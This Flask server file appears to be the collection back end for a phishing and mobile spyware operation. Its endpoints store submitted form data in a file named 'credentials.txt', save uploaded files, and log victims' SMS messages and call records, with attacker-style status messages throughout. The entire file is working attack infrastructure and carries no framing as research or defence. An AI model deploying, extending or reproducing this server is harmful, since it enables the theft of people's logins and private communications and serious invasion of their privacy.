from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import json
from datetime import datetime

app = Flask(__name__)
CORS(app)

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/submit', methods=['POST'])
def submit():
    print("[+] Received POST request")

    data = request.form.to_dict()
    print("[*] Data received:", data)

    try:
        with open('credentials.txt', 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, indent=2) + '\n')
        print("[+] Data saved to credentials.txt")
    except Exception as e:
        print("[!] Error writing data:", e)

    if 'file' in request.files:
        try:
            file = request.files['file']
            filename = datetime.now().strftime('%Y%m%d_%H%M%S_') + file.filename
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            file.save(filepath)
            print("[+] File saved:", filepath)
        except Exception as e:
            print("[!] Error saving file:", e)

    return 'Received'


@app.route('/submit_sms', methods=['POST'])
def submit_sms():
    print("[+] Received SMS data")
    try:
        sms_data = request.get_json()
        with open('sms_log.json', 'a', encoding='utf-8') as f:
            json.dump(sms_data, f, ensure_ascii=False, indent=2)
            f.write('\n')
        print(f"[+] Saved {len(sms_data)} SMS messages.")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print("[!] Error handling SMS data:", e)
        return jsonify({"error": str(e)}), 500


@app.route('/submit_calls', methods=['POST'])
def submit_calls():
    print("[+] Received Call Log data")
    try:
        call_data = request.get_json()
        with open('call_log.json', 'a', encoding='utf-8') as f:
            json.dump(call_data, f, ensure_ascii=False, indent=2)
            f.write('\n')
        print(f"[+] Saved {len(call_data)} call log entries.")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print("[!] Error handling call log data:", e)
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    print("[*] Starting Flask server on http://0.0.0.0:5000 ...")
    app.run(host='0.0.0.0', port=5000)
